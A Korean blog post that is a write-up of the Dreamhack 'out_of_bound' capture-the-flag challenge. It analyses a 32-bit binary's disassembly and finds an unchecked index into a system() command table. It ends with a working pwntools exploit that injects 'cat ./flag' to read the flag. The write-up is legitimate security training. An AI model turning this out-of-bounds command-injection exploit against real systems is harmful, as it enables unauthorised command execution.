---
layout: post
title: 'Dreamhack-out of bound 문제 풀이'
summary: out of bound 문제 풀이
author: TouBVa
date: '2024-12-01 16:00:00 +09'
category: ['system_hacking']
thumbnail: /assets/img/posts/2024-12-01-out-of-bound/Untitled.png
keywords: system_hacking, OOB
usemathjax: true
permalink: /blog/system_hacking/2024-12-01-out-of-bound
---

* TOC
{:toc}

<br>


## 0. 메타데이터 확인

<br>

![/assets/img/posts/2024-12-01-out-of-bound/Untitled.png](/assets/img/posts/2024-12-01-out-of-bound/Untitled.png){: width="100%" height="100%"}

<br>

- ELF32
- Little endian

![/assets/img/posts/2024-12-01-out-of-bound/Untitled_1.png](/assets/img/posts/2024-12-01-out-of-bound/Untitled_1.png){: width="100%" height="100%"}

<br>

- not stripped
- c언어 라이브러리 사용

![/assets/img/posts/2024-12-01-out-of-bound/Untitled_2.png](/assets/img/posts/2024-12-01-out-of-bound/Untitled_2.png){: width="100%" height="100%"}

<br>

- 스택에서 쉘코드 실행 어려움
- 스택 카나리 켜져 있음
- PIE는 꺼져 있어서 코드 영역 주소 고정, 즉 plt, got 테이블 고정

새로 안 사실: checksec은 사실 pwntools 라이브러리의 하위 응용이었다.

![/assets/img/posts/2024-12-01-out-of-bound/Untitled_3.png](/assets/img/posts/2024-12-01-out-of-bound/Untitled_3.png){: width="100%" height="100%"}

<br>

**가설: plt, got 테이블을 타고 들어가야 할 수도 있겠다, RAO를 사용할 만하다, 가젯을 사용해 ROP을 해야 할 수도?**

<br>

## 1. 행위 확인

<br>

![/assets/img/posts/2024-12-01-out-of-bound/Untitled_4.png](/assets/img/posts/2024-12-01-out-of-bound/Untitled_4.png){: width="100%" height="100%"}

<br>

사용자의 입력을 총 2회 받는다.

이제 어셈을 분석해 보자.

<br>

## 2. 정적 및 동적 분석

<br>

### 2.1. 내부 함수 리스트 확인

<br>

![/assets/img/posts/2024-12-01-out-of-bound/Untitled_5.png](/assets/img/posts/2024-12-01-out-of-bound/Untitled_5.png){: width="100%" height="100%"}

<br>

systeml 함수의 plt가 로딩되어 있다는 점을 염두에 두고 접근하자.

<br>

### 2.2. main 함수 확인

<br>

일단 main 함수를 디스어셈블해 보았다.

![/assets/img/posts/2024-12-01-out-of-bound/Untitled_6.png](/assets/img/posts/2024-12-01-out-of-bound/Untitled_6.png){: width="100%" height="100%"}

<br>

내부에서 system 함수를 콜하는데 직전에 사용자 입력값의 길이를 제한하지 않아 취약한 함수인 scanf를 사용한다.

왠지 system 함수에 들어갈 커맨드를 오염시킬 수 있을 것 같다.

<br>

1. `Admin name:` 을 출력하고, 사용자 입력을 `0x804a0ac`에 0x10 byte 받는 부분

```nasm
   0x080486f4 <+41>:    call   0x80484b0 <printf@plt>   0x080486f9 <+46>:    add    esp,0x10   0x080486fc <+49>:    sub    esp,0x4   0x080486ff <+52>:    push   0x10   0x08048701 <+54>:    push   0x804a0ac   0x08048706 <+59>:    push   0x0   0x08048708 <+61>:    call   0x80484a0 <read@plt>
```

1. scanf가 값을 읽어와 저장하는 위치(ebp-0x10)

```nasm
   0x08048723 <+88>:    lea    eax,[ebp-0x10]   0x08048726 <+91>:    push   eax   0x08048727 <+92>:    push   0x8048832   0x0804872c <+97>:    call   0x8048540 <__isoc99_scanf@plt>
```

1. system 함수가 사용하는 커맨드의 위치

```nasm
   0x08048731 <+102>:   add    esp,0x10   0x08048734 <+105>:   mov    eax,DWORD PTR [ebp-0x10]   0x08048737 <+108>:   mov    eax,DWORD PTR [eax*4+0x804a060]   0x0804873e <+115>:   sub    esp,0xc   0x08048741 <+118>:   push   eax   0x08048742 <+119>:   call   0x8048500 <system@plt>
```

<br>

line 108이 이해가 안된다. eax는 ebp-0x10 주소값이 들어있는데, 따라서 ebp-0x10 위치에 있는 값을 참조하게 된다.

그리고 ebp-0x10 에는 사용자의 입력값이 들어 있다.

코드를 보면 `0x804a060` 에 저장된 주소를 베이스로 하고, eax*4를 오프셋으로 하여 커맨드 set에 접근하는 모양새인 것 같은데 맞을까? 그럼 테이블처럼 명령어를 참조하는 방식인 듯 하다.

![/assets/img/posts/2024-12-01-out-of-bound/Untitled_7.png](/assets/img/posts/2024-12-01-out-of-bound/Untitled_7.png){: width="100%" height="100%"}

<br>

맞는 것 같다. 그럼 테이블의 위치를 참조하기 위해 ebp-0x10위치에 저장되는 사용자의 두 번째 입력값을 이용하는 게 된다.

<br>

### 2.3. 동적 분석

<br>

실제로 프로그램을 run해 보았고, 가설을 세웠다.

<br>

**[시도 1]**

1. 두번째 입력을 받을 때, ls를 참조하도록 2를 입력해 해당 응용이 위치한 디렉토리 내 파일을 파악한다.

**[결과]**

![/assets/img/posts/2024-12-01-out-of-bound/Untitled_8.png](/assets/img/posts/2024-12-01-out-of-bound/Untitled_8.png){: width="100%" height="100%"}

<br>

**[시도 2]**

1. 첫번째로 사용자 입력을 받아 저장하는 곳은 `0x804a0ac` 으로, 명령어 테이블의 시작인 `0x804a060` (`0x80487f0` 을 저장하고 있고, 0x80487f0에는 문자열로 명령어가 저장되어 있음) 보다 `0x4C` 큰 주소다.
2. `0x4C` 을 4로 나누면 `0x13`이다.
3. 그럼 첫번째 입력 시에는 시도 1에서 알아낸 디렉토리 구조를 참고하여 `cat {플래그 파일 이름}` 명령어를 넣고, 두번째 입력 시에는 `0x13`를 넣는다면 내가 원하는 명령어가 참조되지 않을까?

**[결과]**

되긴 된다. 그런데 문제는 아래 부분이었다.

```nasm
   0x08048731 <+102>:   add    esp,0x10   0x08048734 <+105>:   mov    eax,DWORD PTR [ebp-0x10]   0x08048737 <+108>:   mov    eax,DWORD PTR [eax*4+0x804a060]   0x0804873e <+115>:   sub    esp,0xc   0x08048741 <+118>:   push   eax   0x08048742 <+119>:   call   0x8048500 <system@plt>
```

<br>

단순히 내가 입력했던 명령어의 시작 주소를 가리키도록 line 108을 조정하면 eax에는 내가 입력했던 명령어의 앞 4byte만 들어간다. 또한, 기본적으로 참조할 주소를 저장하는 레지스터의 특성상 아무 일도 일어나지 않는다.

![/assets/img/posts/2024-12-01-out-of-bound/Untitled_9.png](/assets/img/posts/2024-12-01-out-of-bound/Untitled_9.png){: width="100%" height="100%"}

<br>

첫번째로 입력을 받을 때 0x10byte를 받는다.

내가 이용할 수 있는 건 16 byte의 공간이다.

그 중 처음 4byte를 이후 12byte의 시작 주소가 되도록 조정한다.

<br>

**[시도 3]**

```python
from pwn import *# p = process('./out_of_bound')p=remote('host3.dreamhack.games', 14273)
payload = p32(0x804a0b0, endian='little')
payload += b'cat ./flag'p.recvuntil("Admin name: ")
p.sendline(payload)
p.recvuntil("What do you want?: ")
p.sendline("19")
# gdb.attach(p, gdbscript='b *(main+115)')p.interactive()
```

**[결과]**

![/assets/img/posts/2024-12-01-out-of-bound/Untitled_10.png](/assets/img/posts/2024-12-01-out-of-bound/Untitled_10.png){: width="100%" height="100%"}

<br>

플래그 획득에 성공했다!